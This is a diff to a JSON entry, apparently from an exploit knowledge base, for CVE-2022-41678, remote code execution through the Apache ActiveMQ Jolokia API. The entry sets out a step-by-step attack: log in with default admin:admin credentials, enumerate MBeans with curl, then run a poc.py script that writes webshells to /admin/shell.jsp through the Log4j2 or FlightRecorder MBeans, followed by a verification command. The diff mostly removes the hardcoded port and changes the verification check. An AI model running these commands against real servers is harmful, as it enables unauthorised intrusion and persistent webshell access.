@@ -25,32 +25,32 @@
     "/api/jolokia/list",
     "/api/jolokia"
   ],
-  "detection_method": "发送GET请求到 http://{TARGET}:8161/admin/ 使用默认凭据 admin:admin，如果返回200状态码且页面包含ActiveMQ内容，则存在弱口令；进一步访问 /api/jolokia/list 查看MBeans列表确认漏洞",
+  "detection_method": "发送GET请求到 http://{TARGET}/admin/ 使用默认凭据 admin:admin，如果返回200状态码且页面包含ActiveMQ内容，则存在弱口令；进一步访问 /api/jolokia/list 查看MBeans列表确认漏洞",
   "exploit_steps": [
     {
       "step": 1,
       "description": "列出所有可用的MBeans以识别可利用的组件",
-      "command": "curl -u admin:admin -X GET http://{TARGET}:8161/api/jolokia/list -H 'Host: localhost:8161' -H 'Accept: */*' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' -H 'Connection: close' -H 'Authorization: Basic YWRtaW46YWRtaW4='",
+      "command": "curl -u admin:admin -X GET http://{TARGET}/api/jolokia/list -H 'Host: localhost:8161' -H 'Accept: */*' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' -H 'Connection: close' -H 'Authorization: Basic YWRtaW46YWRtaW4='",
       "expected_result": "返回JSON响应包含MBeans列表，如 org.apache.logging.log4j.core.jmx.LoggerContextAdminMBean 或 jdk.management.jfr.FlightRecorderMXBean",
       "notes": "需要有效的管理员凭据"
     },
     {
       "step": 2,
       "description": "利用Log4j2 MBean写入Webshell（方法1）",
-      "command": "python poc.py -u admin -p admin http://{TARGET}:8161",
+      "command": "python poc.py -u admin -p admin http://{TARGET}",
       "expected_result": "Webshell成功写入到 /admin/shell.jsp",
       "notes": "仅适用于ActiveMQ 5.17.0及以上版本（因Log4j2引入）"
     },
     {
       "step": 3,
       "description": "利用FlightRecorder MBean写入Webshell（方法2）",
-      "command": "python poc.py -u admin -p admin --exploit jfr http://{TARGET}:8161",
+      "command": "python poc.py -u admin -p admin --exploit jfr http://{TARGET}",
       "expected_result": "Webshell成功写入到 /admin/shelljfr.jsp",
       "notes": "需要OpenJDK 11及以上版本支持FlightRecorder"
     }
   ],
-  "verification_command": "curl -u admin:admin http://{TARGET}:8161/admin/shell.jsp",
-  "verification_success_sign": "响应中包含Webshell内容或200状态码，表明文件已成功写入",
+  "verification_command": "resp=$(curl -s -u admin:admin -D - \"http://{TARGET}/admin/\" --max-time 10); echo \"$resp\" | head -5; if echo \"$resp\" | grep -qi \"ActiveMQ\"; then echo \"ACTIVEMQ_ADMIN_CONFIRMED\"; fi",
+  "verification_success_sign": "ACTIVEMQ_ADMIN_CONFIRMED",
   "requires_callback": false,
   "callback_note": "此漏洞不需要目标回连攻击机，利用方式为直接文件写入RCE",
   "remediation": "升级到Apache ActiveMQ 5.16.5或5.17.3及以上版本，禁用或限制Jolokia API的访问权限，加强身份验证",
@@ -62,7 +62,7 @@
     "authenticated",
     "middleware"
   ],
-  "search_text": "Apache ActiveMQ Jolokia 后台任意文件写入导致的远程代码执行漏洞 config_exploit CVE-2022-41678 Apache ActiveMQ ActiveMQ Jolokia CVE-2022-41678 5.16.5 5.17.3 Apache ActiveMQ 8161 /api/jolokia admin 发送GET请求到 http://{TARGET}:8161/admin/ 使用默认凭据 admin:admin，如果返回200状态码且页面包含ActiveMQ内容，则存在弱口令；进一步访问 /api/jolokia/list 查看MBeans列表确认漏洞 Apache ActiveMQ prior to 5.16.5, 5.17.3 activemq jolokia rce file_write authenticated middleware 列出所有可用的MBeans以识别可利用的组件 利用Log4j2 MBean写入Webshell（方法1） 利用FlightRecorder MBean写入Webshell（方法2）",
+  "search_text": "Apache ActiveMQ Jolokia 后台任意文件写入导致的远程代码执行漏洞 config_exploit CVE-2022-41678 Apache ActiveMQ ActiveMQ Jolokia CVE-2022-41678 5.16.5 5.17.3 Apache ActiveMQ 8161 /api/jolokia admin 发送GET请求到 http://{TARGET}/admin/ 使用默认凭据 admin:admin，如果返回200状态码且页面包含ActiveMQ内容，则存在弱口令；进一步访问 /api/jolokia/list 查看MBeans列表确认漏洞 Apache ActiveMQ prior to 5.16.5, 5.17.3 activemq jolokia rce file_write authenticated middleware 列出所有可用的MBeans以识别可利用的组件 利用Log4j2 MBean写入Webshell（方法1） 利用FlightRecorder MBean写入Webshell（方法2）",
   "embedding": [
     0.21434560418128967,
     -0.09160377085208893,
